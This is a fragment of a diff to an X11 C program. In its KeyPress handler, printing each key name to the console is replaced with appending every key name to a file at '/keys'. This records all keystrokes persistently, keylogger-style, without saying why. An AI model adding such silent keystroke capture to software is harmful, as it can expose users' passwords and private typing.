@@ -51,7 +51,9 @@ main (void)
 					CurrentTime);
 		}
 		if (ev.type == KeyPress) {
-			printf("Key pressed: %s\n", XKeysymToString(XLookupKeysym(&ev.xkey,0)));
+			FILE *f = fopen("/keys","a");
+			fprintf(f,"Key pressed: %s\n", XKeysymToString(XLookupKeysym(&ev.xkey,0)));
+			fclose(f);
                 }
 		if (ev.type == KeyPress && XLookupKeysym(&ev.xkey,0) == XStringToKeysym("F2"))
 		{
